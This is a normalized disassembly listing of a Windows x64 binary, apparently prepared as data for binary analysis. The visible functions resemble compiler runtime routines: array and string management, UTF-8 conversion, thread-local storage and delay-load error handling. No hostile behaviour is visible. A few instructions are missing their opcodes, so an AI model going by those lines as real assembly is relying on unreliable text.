jmp r-xdata
jmp r-xdata
movzx rax [ rsi + 0x1 ]
lea r14 [ rsi + rax ]
jmp r-xdata
test rdi rdi
ja r-xdata
mov rcx rbx
mov rax [ r14 + 0xa ]
mov rdx [ rax ]
mov r8d [ r14 + 0x6 ]
call sub_408f10
mov eax [ r14 + 0x2 ]
add rbx rax
sub rdi 0x1
jmp r-xdata
sub_4090b0
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] rcx
mov [ rsp + 0x28 ] rdx
movzx rax [ r8 + 0x1 ]
lea rbx [ r8 + rax ]
xor r13 r13
cmp [ rbx + 0x6 ] 0x0
jbe r-xdata
mov eax [ rbx + 0x2 ]
cmp rax r13
jbe r-xdata
xor rdi rdi
mov r14d [ rbx + 0x6 ]
sub r14d 0x1
cmp edi r14d
ja r-xdata
add rsp 0x30
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
mov rax [ rsp + 0x28 ]
lea rcx [ rax + r13 ]
mov rax [ rsp + 0x20 ]
lea rdx [ rax + r13 ]
mov eax [ rbx + 0x2 ]
neg r13
lea r8 [ rax + r13 ]
call sub_404ae0
nop
add r14d 0x1
mov eax edi
add rax rax
mov r13d [ rbx + rax * 8 + 0x12 ]
mov eax edi
add rax rax
mov rax [ rbx + rax * 8 + 0xa ]
mov rax [ rax ]
mov rcx [ rsp + 0x20 ]
lea rcx [ rcx + r13 ]
mov rdx [ rsp + 0x28 ]
lea rdx [ rdx + r13 ]
movzx r8 [ rax ]
cmp r8 0xe
jg r-xdata
mov rax [ rsp + 0x28 ]
lea rcx [ rax + r13 ]
mov rax [ rsp + 0x20 ]
lea rdx [ rax + r13 ]
mov eax edi
add rax rax
mov eax [ rbx + rax * 8 + 0x12 ]
neg r13
lea r8 [ rax + r13 ]
call sub_404ae0
sub r8 0xf
test r8 r8
je r-xdata
cmp r8 0xe
je r-xdata
mov rdx [ rdx ]
call sub_409ce0
add r13 0x8
jmp r-xdata
sub r8 0x2
test r8 r8
je r-xdata
movzx r8 [ rax + 0x1 ]
lea rsi [ rax + r8 ]
mov r8 rax
call sub_4090b0
mov eax [ rsi + 0x2 ]
add r13 rax
jmp r-xdata
sub r8 0xa
test r8 r8
je r-xdata
add edi 0x1
cmp edi r14d
jne r-xdata
mov rdx [ rdx ]
mov r8 rax
call sub_409910
add r13 0x8
jmp r-xdata
sub r8 0x1
test r8 r8
jne r-xdata
mov rdx [ rdx ]
call sub_407ca0
add r13 0x8
jmp r-xdata
sub r8 0x1
test r8 r8
je r-xdata
mov eax edi
add rax rax
mov eax [ rbx + rax * 8 + 0x12 ]
cmp rax r13
jbe r-xdata
mov cl 0x2
call sub_404a90
jmp r-xdata
mov rdx [ rdx ]
call sub_407c50
add r13 0x8
jmp r-xdata
sub r8 0x1
test r8 r8
je r-xdata
mov rdx [ rdx ]
call sub_407bd0
add r13 0x8
jmp r-xdata
call sub_409080
add r13 0x18
jmp r-xdata
sub r8 0x1
test r8 r8
jne r-xdata
jmp r-xdata
movzx r8 [ rax + 0x1 ]
lea rsi [ rax + r8 ]
mov rax [ rsi + 0xa ]
mov r8 [ rax ]
mov r9d [ rsi + 0x6 ]
call sub_4092a0
mov eax [ rsi + 0x2 ]
add r13 rax
jmp r-xdata
sub_4092a0
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov rsi rdx
mov rdi r8
mov r13 r9
test r13 r13
je r-xdata
add rsp 0x20
pop rbx
pop rsi
pop rdi
pop r13
pop r14
retn
movzx rax [ rdi ]
cmp rax 0xe
jg r-xdata
sub rax 0xf
test rax rax
je r-xdata
cmp rax 0xe
je r-xdata
test r13 r13
ja r-xdata
sub rax 0x2
test rax rax
je r-xdata
movzx rax [ rdi + 0x1 ]
lea r14 [ rdi + rax ]
jmp r-xdata
sub rax 0xa
test rax rax
je r-xdata
mov rcx rbx
mov rdx [ rsi ]
call sub_409ce0
add rbx 0x8
add rsi 0x8
sub r13 0x1
jmp r-xdata
test r13 r13
ja r-xdata
sub rax 0x1
test rax rax
jne r-xdata
test r13 r13
ja r-xdata
test r13 r13
ja r-xdata
sub rax 0x1
test rax rax
je r-xdata
mov rcx rbx
mov rdx [ rsi ]
mov r8 rdi
call sub_409910
add rbx 0x8
add rsi 0x8
sub r13 0x1
jmp r-xdata
mov cl 0x2
call sub_404a90
jmp r-xdata
mov rcx rbx
mov rdx rsi
mov r8 rdi
call sub_4090b0
mov eax [ r14 + 0x2 ]
add rbx rax
mov eax [ r14 + 0x2 ]
add rsi rax
sub r13 0x1
jmp r-xdata
mov rcx rbx
mov rdx [ rsi ]
call sub_407ca0
add rbx 0x8
add rsi 0x8
sub r13 0x1
jmp r-xdata
test r13 r13
ja r-xdata
sub rax 0x1
test rax rax
je r-xdata
test r13 r13
ja r-xdata
mov rcx rbx
mov rdx [ rsi ]
call sub_407c50
add rbx 0x8
add rsi 0x8
sub r13 0x1
jmp r-xdata
test r13 r13
ja r-xdata
sub rax 0x1
test rax rax
jne r-xdata
mov rcx rbx
mov rdx [ rsi ]
call sub_407bd0
add rbx 0x8
add rsi 0x8
sub r13 0x1
jmp r-xdata
mov rcx rbx
mov rdx rsi
call sub_409080
add rbx 0x18
add rsi 0x18
sub r13 0x1
jmp r-xdata
jmp r-xdata
movzx rax [ rdi + 0x1 ]
lea r14 [ rdi + rax ]
jmp r-xdata
test r13 r13
ja r-xdata
mov rcx rbx
mov rdx rsi
mov rax [ r14 + 0xa ]
mov r8 [ rax ]
mov r9d [ r14 + 0x6 ]
call sub_4092a0
mov eax [ r14 + 0x2 ]
add rbx rax
mov eax [ r14 + 0x2 ]
add rsi rax
sub r13 0x1
jmp r-xdata
sub_4094f0
push rbp
push rbx
sub rsp 0x88
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0xa0 ] rcx
mov [ rbp + 0xa8 ] rdx
mov [ rbp + 0xb0 ] r8
mov [ rbp + 0xb8 ] r9
mov rax [ rbp + 0xa0 ]
mov rax [ rax ]
mov [ rbp + 0x68 ] rax
mov rax [ rbp + 0xb8 ]
mov rax [ rax ]
mov [ rbp + 0x58 ] rax
cmp [ rbp + 0x58 ] 0x0
jg r-xdata
mov [ rbp + 0x50 ] 0x0
cmp [ rbp + 0x68 ] 0x0
je r-xdata
cmp [ rbp + 0x58 ] 0x0
jge r-xdata
mov rax [ rbp + 0xa8 ]
movzx rax [ rax + 0x1 ]
add [ rbp + 0xa8 ] rax
mov rax [ rbp + 0xa8 ]
movsxd rax [ rax + 0x2 ]
mov [ rbp + 0x40 ] rax
mov rax [ rbp + 0xa8 ]
cmp [ rax + 0x6 ] 0x0
je r-xdata
sub [ rbp + 0x68 ] 0x10
mov rax [ rbp + 0x68 ]
mov rax [ rax + 0x8 ]
mov [ rbp + 0x50 ] rax
mov rcx [ rbp + 0xa0 ]
mov rdx [ rbp + 0xa8 ]
call sub_4094e0
jmp r-xdata
mov cl 0x4
call sub_404a90
mov [ rbp + 0xa8 ] 0x0
mov rax [ rbp + 0xa8 ]
mov rax [ rax + 0x6 ]
mov rax [ rax ]
mov [ rbp + 0xa8 ] rax
jmp r-xdata
lea rsp [ rbp + 0x88 ]
pop rbx
pop rbp
retn
add [ rbp + 0x38 ] 0x10
cmp [ rbp + 0x38 ] 0x0
jge r-xdata
mov cl 0x4
call sub_404a90
mov rax [ rbp + 0x58 ]
imul rax [ rbp + 0x40 ]
mov [ rbp + 0x38 ] rax
mov rax [ rbp + 0x38 ]
cqo
idiv [ rbp + 0x58 ]
cmp rax [ rbp + 0x40 ]
je r-xdata
cmp [ rbp + 0x68 ] 0x0
je r-xdata
mov cl 0x4
call sub_404a90
mov rax [ rbp + 0x68 ]
mov [ rbp + 0x30 ] rax
mov rax [ rbp + 0x58 ]
cmp rax [ rbp + 0x50 ]
jge r-xdata
mov rax [ rbp + 0x68 ]
cmp [ rax + 0x4 ] 0x1
jne r-xdata
lea rcx [ rbp + 0x30 ]
mov rdx [ rbp + 0x38 ]
call sub_4047e0
mov rax [ rbp + 0x30 ]
mov [ rbp + 0x68 ] rax
jmp r-xdata
cmp [ rbp + 0xa8 ] 0x0
je r-xdata
mov rax [ rbp + 0x68 ]
lea rax [ rax + 0x4 ]
sub [ rax ] 0x1
mov rcx [ rbp + 0x38 ]
call sub_404780
mov [ rbp + 0x68 ] rax
mov rax [ rbp + 0x50 ]
mov [ rbp + 0x48 ] rax
mov rax [ rbp + 0x48 ]
cmp rax [ rbp + 0x58 ]
jle r-xdata
mov rax [ rbp + 0x68 ]
mov [ rax + 0x4 ] 0x1
mov rax [ rbp + 0x68 ]
mov rcx [ rbp + 0x58 ]
mov [ rax + 0x8 ] rcx
add [ rbp + 0x68 ] 0x10
mov rax [ rbp + 0x58 ]
cmp rax [ rbp + 0x50 ]
jle r-xdata
mov rax [ rbp + 0x68 ]
mov rcx [ rbp + 0x58 ]
imul rcx [ rbp + 0x40 ]
lea rcx [ rax + rcx + 0x10 ]
mov rdx [ rbp + 0xa8 ]
mov rax [ rbp + 0x50 ]
mov r8 [ rbp + 0x58 ]
neg r8
lea r8 [ rax + r8 ]
call sub_409490
cmp [ rbp + 0xa8 ] 0x0
je r-xdata
mov rax [ rbp + 0x58 ]
mov [ rbp + 0x48 ] rax
cmp [ rbp + 0xb0 ] 0x1
jle r-xdata
mov rax [ rbp + 0x68 ]
mov rcx [ rbp + 0x40 ]
imul rcx [ rbp + 0x50 ]
lea rcx [ rax + rcx ]
mov rax [ rbp + 0x58 ]
mov rdx [ rbp + 0x50 ]
neg rdx
lea rax [ rax + rdx ]
mov rdx [ rbp + 0x40 ]
imul rdx rax
xor r8 r8
call sub_404d90
mov rax [ rbp + 0xa0 ]
mov rcx [ rax ]
mov rax [ rbp + 0x68 ]
lea rdx [ rax + 0x10 ]
mov r8 [ rbp + 0x48 ]
imul r8 [ rbp + 0x40 ]
call sub_404ae0
mov rax [ rbp + 0x68 ]
lea rcx [ rax + 0x10 ]
mov rdx [ rbp + 0x48 ]
imul rdx [ rbp + 0x40 ]
xor r8 r8
call sub_404d90
mov rax [ rbp + 0x68 ]
lea rcx [ rax + 0x10 ]
mov rax [ rbp + 0xa0 ]
mov rdx [ rax ]
mov r8 [ rbp + 0xa8 ]
mov r9 [ rbp + 0x48 ]
call sub_409480
jmp r-xdata
mov rax [ rbp + 0xa0 ]
mov rcx [ rbp + 0x68 ]
mov [ rax ] rcx
add [ rbp + 0xb8 ] 0x8
sub [ rbp + 0xb0 ] 0x1
mov [ rbp + 0x70 ] 0x0
nop
jmp r-xdata
mov rax [ rbp + 0x70 ]
cmp rax [ rbp + 0x58 ]
jl r-xdata
mov rax [ rbp + 0x68 ]
mov rcx [ rbp + 0x70 ]
lea rcx [ rax + rcx * 8 ]
mov rdx [ rbp + 0xa8 ]
mov r8 [ rbp + 0xb0 ]
mov r9 [ rbp + 0xb8 ]
call sub_4094f0
add [ rbp + 0x70 ] 0x1
jmp r-xdata
sub_4097d3
xor rax rax
mov rbx [ rbp + 0x70 ]
mov [ rbp + 0x60 ] rax
cmp [ rbp + 0x60 ] rbx
jg r-xdata
nop
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0xa8 ]
call sub_4094e0
call sub_406d90
call sub_406ea0
nop
mov rax [ rbp + 0xa0 ]
mov rcx [ rbp + 0x68 ]
mov [ rax ] rcx
lea rsp [ rbp + 0x88 ]
pop rbx
pop rbp
retn
add rbx 0x1
mov rax [ rbp + 0x68 ]
mov rcx [ rbp + 0x60 ]
lea rcx [ rax + rcx * 8 ]
mov rdx [ rbp + 0xa8 ]
call sub_4094e0
add [ rbp + 0x60 ] 0x1
cmp [ rbp + 0x60 ] rbx
jne r-xdata
sub_409850
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov [ rbp + 0x58 ] r9
mov [ rbp + 0x40 ] rcx
mov [ rbp + 0x48 ] rdx
mov [ rbp + 0x50 ] r8
lea rbx [ rbp + 0x58 ]
mov rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0x48 ]
mov r8 [ rbp + 0x50 ]
mov r9 rbx
call sub_4094f0
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_409890
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
mov rax rdx
mov rsi [ rbx ]
test rsi rsi
je r-xdata
mov rax rbx
add rsp 0x28
pop rbx
pop rsi
retn
mov [ rbx ] 0x0
or edx 0xffffffff
mov ecx edx
[ rsi - 0xc ] edx
add ecx edx
test ecx ecx
jne r-xdata
movzx rcx [ rax + 0x1 ]
add rax rcx
cmp [ rax + 0x6 ] 0x0
je r-xdata
sub rsi 0x10
mov rcx rsi
call sub_4047b0
mov rcx [ rsi - 0x8 ]
test rcx rcx
je r-xdata
mov rax [ rax + 0x6 ]
mov rax [ rax ]
mov rdx rsi
mov r8 rcx
mov rcx rdx
mov rdx rax
call sub_408f10
sub_409910
push rdi
push rsi
push rbx
sub rsp 0x20
mov rbx rcx
mov rsi rdx
mov rdi r8
mov rcx rsi
call sub_409940
mov rcx rbx
mov rdx rdi
call sub_409890
mov [ rbx ] rsi
add rsp 0x20
pop rbx
pop rsi
pop rdi
retn
sub_409960
sub rsp 0x28
lea rcx [ rw-data ]
call InitializeCriticalSection
mov [ rw-data ] 0x7f
call GetVersion
and eax 0xff
cmp eax 0x6
setae al
mov [ rw-data ] al
cmp [ rw-data ] 0x0
je r-xdata
add rsp 0x28
retn
lea rcx [ r-xdata ]
call sub_402380
mov rcx rax
lea rdx [ r-xdata ]
call sub_402390
mov [ rw-data ] rax
lea rcx [ r-xdata ]
call sub_402380
mov rcx rax
lea rdx [ r-xdata ]
call sub_402390
mov [ rw-data ] rax
lea rcx [ r-xdata ]
call sub_402380
mov rcx rax
lea rdx [ r-xdata ]
call sub_402390
mov [ rw-data ] rax
sub_409a90
push rbp
push rbx
sub rsp 0x48
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x60 ] ecx
mov rax [ rw-data ]
mov [ rbp + 0x38 ] rax
cmp [ rbp + 0x38 ] 0x0
je r-xdata
nop
lea rsp [ rbp + 0x48 ]
pop rbx
pop rbp
retn
nop
mov ecx [ rbp + 0x60 ]
mov rbx [ rbp + 0x38 ]
call [ rbx + 0x8 ]
jmp r-xdata
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
mov [ rbp + 0x38 ] rax
cmp [ rbp + 0x38 ] 0x0
jne r-xdata
sub_409b20
push rbp
sub rsp 0x40
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
nop
mov rax [ rbp + 0x50 ]
mov ecx [ rax + 0x8 ]
call sub_409a90
nop
mov rax [ rbp + 0x50 ]
cmp rax [ rw-data ]
jne r-xdata
mov rax [ rw-data ]
mov [ rbp + 0x38 ] rax
cmp [ rbp + 0x38 ] 0x0
je r-xdata
mov rax [ rbp + 0x50 ]
mov rax [ rax ]
mov [ rw-data ] rax
jmp r-xdata
nop
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
cmp rax [ rbp + 0x50 ]
jne r-xdata
lea rsp [ rbp + 0x40 ]
pop rbp
retn
mov rax [ rbp + 0x38 ]
mov rax [ rax ]
mov [ rbp + 0x38 ] rax
cmp [ rbp + 0x38 ] 0x0
jne r-xdata
mov rax [ rbp + 0x38 ]
mov rcx [ rbp + 0x50 ]
mov rcx [ rcx ]
mov [ rax ] rcx
jmp r-xdata
sub_409bb0
push rbp
mov rbp rsp
lea rax [ rdx + rbp + 0x50 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
cmp rax [ rw-data ]
jne r-xdata
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
mov r8 [ rw-data ]
mov [ rax + rcx ] r8
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x0
je r-xdata
lea rax [ rdx + rbp + 0x50 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
mov rax [ rax ]
mov [ rw-data ] rax
jmp r-xdata
nop
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
lea rcx [ rdx + rbp + 0x50 ]
mov r8 rbp
neg r8
mov rax [ rax ]
cmp rax [ rcx + r8 ]
jne r-xdata
mov rsp rbp
pop rbp
retn
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
lea r8 [ rdx + rbp + 0x38 ]
mov r9 rbp
neg r9
mov r8 [ r8 + r9 ]
mov r8 [ r8 ]
mov [ rax + rcx ] r8
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
cmp [ rax + rcx ] 0x0
jne r-xdata
lea rax [ rdx + rbp + 0x38 ]
mov rcx rbp
neg rcx
mov rax [ rax + rcx ]
lea rcx [ rdx + rbp + 0x50 ]
mov rdx rbp
neg rdx
mov rcx [ rcx + rdx ]
mov rcx [ rcx ]
mov [ rax ] rcx
jmp r-xdata
sub_409ca0
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov rbx rcx
cmp [ rcx ] 0x0
je r-xdata
mov rax rbx
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rax [ rcx ]
mov [ rbp + 0x28 ] rax
mov [ rcx ] 0x0
mov rcx [ rbp + 0x28 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
call [ rax + 0x10 ]
sub_409ce0
push rbp
push rsi
push rbx
sub rsp 0x30
mov rbp rsp
mov rbx rcx
mov rsi rdx
mov rax [ rbx ]
mov [ rbp + 0x28 ] rax
test rsi rsi
je r-xdata
mov [ rbx ] rsi
cmp [ rbp + 0x28 ] 0x0
je r-xdata
mov rcx rsi
mov rax [ rsi ]
call [ rax + 0x8 ]
lea rsp [ rbp + 0x30 ]
pop rbx
pop rsi
pop rbp
retn
mov rcx [ rbp + 0x28 ]
mov rax [ rbp + 0x28 ]
mov rax [ rax ]
call [ rax + 0x10 ]
sub_409d30
push rdi
push rsi
push rbx
sub rsp 0x40
mov rbx rcx
mov esi edx
mov edi r9d
xor rax rax
test r8 r8
je r-xdata
add rsp 0x40
pop rbx
pop rsi
pop rdi
retn
test rbx rbx
je r-xdata
mov ecx 0xfde9
xor rdx rdx
mov r9d edi
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x38 ] 0x0
call sub_40a030
mov ecx 0xfde9
xor rdx rdx
mov r9d edi
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x38 ] 0x0
call sub_40a030
test eax eax
jbe r-xdata
cmp eax esi
ja r-xdata
cmp edi 0xffffffff
jne r-xdata
cmp eax esi
jne r-xdata
mov ecx eax
cmp [ rbx + rcx - 0x1 ] 0x0
je r-xdata
add eax 0x1
jmp r-xdata
cmp eax 0x1
jbe r-xdata
mov ecx eax
mov [ rbx + rcx - 0x1 ] 0x0
jmp r-xdata
mov ecx eax
cmp [ rbx + rcx - 0x1 ] 0x7f
jbe r-xdata
mov ecx eax
movzx rcx [ rbx + rcx - 0x1 ]
test cl 0x80
je r-xdata
mov ecx eax
movzx rcx [ rbx + rcx - 0x1 ]
and cl 0xc0
cmp cl 0xc0
jne r-xdata
sub eax 0x1
jmp r-xdata
sub_409e20
push rdi
push rsi
push rbx
sub rsp 0x30
mov rbx rcx
mov esi edx
mov edi r9d
xor rax rax
test r8 r8
je r-xdata
add rsp 0x30
pop rbx
pop rsi
pop rdi
retn
test rbx rbx
je r-xdata
mov ecx 0xfde9
xor rdx rdx
mov r9d edi
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x28 ] 0x0
call sub_40a070
test esi esi
jbe r-xdata
mov ecx 0xfde9
xor rdx rdx
mov r9d edi
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x28 ] esi
call sub_40a070
test eax eax
jbe r-xdata
cmp eax esi
ja r-xdata
cmp edi 0xffffffff
jne r-xdata
cmp eax esi
jne r-xdata
mov ecx eax
cmp [ rbx + rcx * 2 - 0x2 ] 0x0
je r-xdata
add eax 0x1
cmp eax 0x1
jbe r-xdata
mov ecx eax
mov [ rbx + rcx * 2 - 0x2 ] 0x0
jmp r-xdata
mov ecx eax
cmp [ rbx + rcx * 2 - 0x2 ] 0xdc00
jb r-xdata
mov ecx eax
cmp [ rbx + rcx * 2 - 0x2 ] 0xdfff
ja r-xdata
sub eax 0x1
jmp r-xdata
sub_409ee0
push rsi
push rbx
sub rsp 0x28
mov rbx rcx
xor rsi rsi
test rdx rdx
je r-xdata
mov rcx rdx
call sub_408900
lea rcx [ rbx + 0x1 ]
mov edx 0xff
mov r8 rax
mov r9d esi
call sub_409d30
sub eax 0x1
test eax eax
jge r-xdata
mov esi [ rdx - 0x4 ]
mov [ rbx ] al
mov rax rbx
add rsp 0x28
pop rbx
pop rsi
retn
xor rax rax
sub_409f30
push rbp
push rbx
sub rsp 0x48
mov rbp rsp
mov [ rbp + 0x20 ] rcx
mov [ rbp + 0x28 ] rdx
mov [ rbp + 0x38 ] 0x0
nop
mov rcx [ rbp + 0x20 ]
call sub_407730
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0x0
je r-xdata
lea rcx [ rbp + 0x38 ]
call sub_407730
mov rax [ rbp + 0x20 ]
lea rsp [ rbp + 0x48 ]
pop rbx
pop rbp
retn
mov rax [ rbp + 0x28 ]
movzx rbx [ rax ]
lea rcx [ rbp + 0x38 ]
mov edx ebx
call sub_408980
mov rcx [ rbp + 0x38 ]
call sub_408900
mov rcx rax
mov edx ebx
add edx 0x1
mov rax [ rbp + 0x28 ]
lea r8 [ rax + 0x1 ]
mov r9d ebx
call sub_409e20
mov ebx eax
test ebx ebx
jle r-xdata
lea rcx [ rbp + 0x38 ]
call sub_407730
lea rcx [ rbp + 0x38 ]
mov edx ebx
sub edx 0x1
call sub_408980
jmp r-xdata
mov rcx [ rbp + 0x20 ]
mov rdx [ rbp + 0x38 ]
call sub_407bd0
nop
sub_40a0b0
sub rsp 0x28
call GetVersion
mov ecx eax
and ecx 0xff
and eax 0xff00
shr eax 0x8
cmp ecx 0x5
jne r-xdata
cmp ecx 0x5
jbe r-xdata
cmp eax 0x1
jae r-xdata
mov [ rw-data ] 0x409
mov [ rw-data ] 0x7f
jmp r-xdata
add rsp 0x28
retn
sub_40a170
sub rsp 0x28
add [ rw-data ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x28
retn
lea rcx [ rw-data ]
call sub_404d20
lea rcx [ rw-data ]
call sub_404d20
lea rcx [ rw-data ]
call sub_404d20
call sub_409a70
cmp [ rw-data ] 0x0
je r-xdata
call sub_404710
mov rcx [ rw-data ]
call sub_4047b0
sub_40a1d0
sub rsp 0x28
sub [ rw-data ] 0x1
cmp [ rw-data ] 0xffffffff
jne r-xdata
add rsp 0x28
retn
mov ecx 0x400
call SetThreadLocale
call sub_4042e0
call sub_409960
mov [ rw-data ] 0x2
lea rax [ sub_402320 ]
mov [ rw-data ] rax
lea rax [ r-xdata ]
mov [ rw-data ] rax
mov [ rw-data ] 0x2
call sub_40a090
mov [ rw-data ] eax
lea rax [ sub_4094a0 ]
mov [ rw-data ] rax
call sub_4050b0
call sub_4050e0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineW
mov [ rw-data ] rax
call sub_4024b0
mov [ rw-data ] eax
call GetACP
mov [ rw-data ] eax
mov [ rw-data ] 0x4b0
call GetCurrentThreadId
mov [ rw-data ] eax
call sub_40a0b0
sub_40a380
push rbx
sub rsp 0x20
call sub_40a370
mov ebx eax
test ebx ebx
je r-xdata
add rsp 0x20
pop rbx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx ebx
call sub_40a350
test rax rax
jne r-xdata
mov ecx 0xe2
call sub_4075a0
mov ecx [ rw-data ]
mov rdx rax
call TlsSetValue
mov ecx 0xe2
call sub_4075a0
sub_40a3e0
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov rax [ gs : 0x58 ]
movsxd rcx [ rw-data ]
mov rax [ rax + rcx * 8 ]
mov ecx [ rw-data ]
call TlsGetValue
test rax rax
jne r-xdata
add rsp 0x28
retn
call sub_40a380
mov ecx [ rw-data ]
call TlsGetValue
test rax rax
jne r-xdata
mov rax [ rw-data ]
jmp r-xdata
sub_40a470
push rbp
sub rsp 0x110
mov rbp rsp
mov [ rbp + 0xf8 ] rbp
nop
mov rcx [ rbp + 0x108 ]
mov rdx [ rbp + 0x108 ]
mov r8 [ rbp + 0x108 ]
mov r9 [ rbp + 0x108 ]
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x20 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x38 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x40 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x48 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x50 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x58 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x60 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x68 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x70 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x78 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x80 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x88 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x90 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0x98 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xa0 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xa8 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xb0 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xb8 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xc0 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xc8 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xd0 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xd8 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xe0 ] rax
mov rax [ rbp + 0x108 ]
mov [ rsp + 0xe8 ] rax
call sub_40a460
jmp r-xdata
lea rsp [ rbp + 0x110 ]
pop rbp
retn
sub_40a7b0
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rw-data ] 0x0
xor rcx rcx
call GetModuleHandleW
mov [ rw-data ] rax
mov rax [ rw-data ]
mov [ rw-data ] rax
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
lea rax [ rbx + 0x10 ]
mov [ rw-data ] rax
lea rax [ sub_40a470 ]
mov [ rw-data ] rax
call sub_40a440
mov rcx rbx
lea rdx [ rw-data ]
call sub_407060
add rsp 0x20
pop rbx
retn
sub_40a830
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x130
mov rax [ rsp + 0x140 ]
mov eax [ rax ]
mov [ rsp + 0xa0 ] eax
mov rax [ rsp + 0x140 ]
mov ecx [ rax + 0x4 ]
call sub_40b4c0
mov [ rsp + 0xa8 ] rax
mov rax [ rsp + 0x140 ]
mov ecx [ rax + 0x8 ]
call sub_40b4e0
mov [ rsp + 0xb0 ] rax
mov rax [ rsp + 0x140 ]
mov ecx [ rax + 0xc ]
call sub_40b500
mov [ rsp + 0xb8 ] rax
mov rax [ rsp + 0x140 ]
mov ecx [ rax + 0x10 ]
call sub_40b520
mov [ rsp + 0xc0 ] rax
mov rax [ rsp + 0x140 ]
mov ecx [ rax + 0x14 ]
call sub_40b520
mov [ rsp + 0xc8 ] rax
mov rax [ rsp + 0x140 ]
mov ecx [ rax + 0x18 ]
call sub_40b520
mov [ rsp + 0xd0 ] rax
mov rax [ rsp + 0x140 ]
mov eax [ rax + 0x1c ]
mov [ rsp + 0xd8 ] eax
mov [ rsp + 0x40 ] 0x48
mov rax [ rsp + 0x140 ]
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0x148 ]
mov [ rsp + 0x50 ] rax
mov rax [ rsp + 0xa8 ]
mov [ rsp + 0x58 ] rax
mov [ rsp + 0x60 ] 0x0
lea rdi [ rsp + 0x68 ]
xor eax eax
mov ecx 0x8
[ rdi ]
mov [ rsp + 0x70 ] 0x0
mov [ rsp + 0x78 ] 0x0
mov [ rsp + 0x80 ] 0x0
mov eax [ rsp + 0xa0 ]
and eax 0x1
test eax eax
jne r-xdata
mov rax [ rsp + 0xb0 ]
mov rax [ rax ]
mov [ rsp + 0x20 ] rax
mov rdx [ rsp + 0xb8 ]
mov rcx [ rsp + 0x148 ]
call sub_40b2b0
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0x30 ]
mov [ rsp + 0x90 ] eax
mov ecx [ rsp + 0x90 ]
mov rax [ rsp + 0xc0 ]
lea rax [ rax + rcx * 8 ]
mov [ rsp + 0xe0 ] rax
mov rax [ rsp + 0xe0 ]
mov rcx 0x8000000000000000
mov rax [ rax ]
and rax rcx
test rax rax
jne r-xdata
lea rax [ rsp + 0x40 ]
mov [ rsp + 0xe8 ] rax
lea r9 [ rsp + 0xe8 ]
mov r8d 0x1
xor edx edx
mov ecx 0xc06d0057
call RaiseException
xor eax eax
jmp r-xdata
mov [ rsp + 0x118 ] 0x0
